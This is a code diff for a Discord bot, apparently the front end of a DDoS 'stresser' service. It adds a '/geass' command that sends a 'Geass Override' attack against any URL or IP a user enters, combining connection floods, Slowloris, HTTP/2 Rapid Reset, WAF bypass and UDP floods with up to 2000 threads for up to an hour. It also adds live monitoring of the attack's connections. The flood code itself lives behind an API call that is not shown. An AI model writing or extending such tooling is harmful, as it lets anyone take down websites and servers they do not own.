@@ -92,6 +92,19 @@ const COMMANDS = [
   new SlashCommandBuilder()
     .setName("help")
     .setDescription("❓ Show Lelouch Britannia command guide"),
+
+  new SlashCommandBuilder()
+    .setName("geass")
+    .setDescription("👁️ Launch Geass Override ∞ (max power — 5 vectors simultaneously)")
+    .addStringOption(opt =>
+      opt.setName("target").setDescription("Target URL or IP (e.g. https://example.com)").setRequired(true)
+    )
+    .addIntegerOption(opt =>
+      opt.setName("duration").setDescription("Duration in seconds (default: 60)").setRequired(false).setMinValue(5).setMaxValue(3600)
+    )
+    .addIntegerOption(opt =>
+      opt.setName("threads").setDescription("Base thread count — geass scales beyond this (default: 100)").setRequired(false).setMinValue(1).setMaxValue(2000)
+    ),
 ].map(c => c.toJSON());
 
 // ── Deploy slash commands ─────────────────────────────────────────────────────
@@ -117,7 +130,10 @@ function startMonitor(attackId: number, msg: Message): void {
   const INTERVAL_SEC = 5;
 
   const tick = setInterval(async () => {
-    const attack = await api.getAttack(attackId);
+    const [attack, live] = await Promise.all([
+      api.getAttack(attackId),
+      api.getLiveConns(attackId).catch(() => ({ conns: 0, running: false })),
+    ]);
     if (!attack) {
       clearInterval(tick);
       monitors.delete(attackId);
@@ -132,7 +148,7 @@ function startMonitor(attackId: number, msg: Message): void {
     prevPackets.set(attackId, attack.packetsSent);
 
     try {
-      await msg.edit({ embeds: [buildAttackEmbed(attack, livePps)] });
+      await msg.edit({ embeds: [buildAttackEmbed(attack, livePps, live?.conns ?? 0)] });
     } catch { /* message may have been deleted */ }
 
     if (attack.status !== "running") {
@@ -276,6 +292,61 @@ async function handleHelp(interaction: ChatInputCommandInteraction): Promise<voi
   await interaction.reply({ embeds: [buildHelpEmbed()] });
 }
 
+async function handleGeass(interaction: ChatInputCommandInteraction): Promise<void> {
+  await interaction.deferReply();
+
+  const target   = interaction.options.getString("target", true);
+  const duration = interaction.options.getInteger("duration") ?? 60;
+  const threads  = interaction.options.getInteger("threads")  ?? 100;
+  const user     = interaction.user.tag;
+  const isHttps  = /^https:/i.test(target);
+  const port     = isHttps ? 443 : 80;
+
+  console.log(`[GEASS] ${user} → ${target} | geass-override | ${threads}t | ${duration}s`);
+
+  // Show initializing embed immediately
+  await interaction.editReply({
+    embeds: [
+      new EmbedBuilder()
+        .setColor(COLORS.CRIMSON)
+        .setTitle("👁️ LELOUCH vi BRITANNIA COMMANDS YOU...")
+        .setDescription(
+          `> *"I, Lelouch vi Britannia, hereby command all opposition... TO SUBMIT!"*\n\n` +
+          `⚡ **GEASS OVERRIDE** launching 5 simultaneous vectors against \`${target}\`\n` +
+          `**Conn Flood → Slowloris → HTTP/2 Rapid Reset → WAF Bypass → UDP**`
+        )
+        .addFields(
+          { name: "🎯 Target",   value: `\`${target}\``,       inline: true },
+          { name: "⏱ Duration",  value: `**${duration}s**`,     inline: true },
+          { name: "🧵 Threads",  value: `**${threads}** (base)`, inline: true },
+          { name: "📊 Status",   value: "🔴 **INITIALIZING VECTORS...**", inline: false },
+        )
+        .setFooter({ text: AUTHOR })
+        .setTimestamp()
+    ],
+  });
+
+  try {
+    const attack = await api.startAttack({ target, method: "geass-override", threads, duration, port });
+    console.log(`[GEASS #${attack.id}] Vectors online → ${target}`);
+
+    const startEmbed = buildStartEmbed(attack);
+    const row = new ActionRowBuilder<ButtonBuilder>().addComponents(
+      new ButtonBuilder()
+        .setCustomId(`stop_${attack.id}`)
+        .setLabel("⏹️ Stop Geass")
+        .setStyle(ButtonStyle.Danger),
+    );
+    const msg = await interaction.editReply({ embeds: [startEmbed], components: [row] });
+    startMonitor(attack.id, msg as Message);
+  } catch (err: unknown) {
+    const message = err instanceof Error ? err.message : String(err);
+    await interaction.editReply({
+      embeds: [buildErrorEmbed("GEASS FAILED", `Could not launch:\n\`\`\`\n${message}\n\`\`\``)],
+    });
+  }
+}
+
 // ── Button Interaction Handler ────────────────────────────────────────────────
 async function handleButton(interaction: import("discord.js").ButtonInteraction): Promise<void> {
   const [action, idStr] = interaction.customId.split("_");
@@ -346,6 +417,8 @@ async function main(): Promise<void> {
         await handleMethods(interaction);
       } else if (commandName === "help") {
         await handleHelp(interaction);
+      } else if (commandName === "geass") {
+        await handleGeass(interaction);
       }
     } catch (err) {
       console.error("[INTERACTION ERROR]", err);
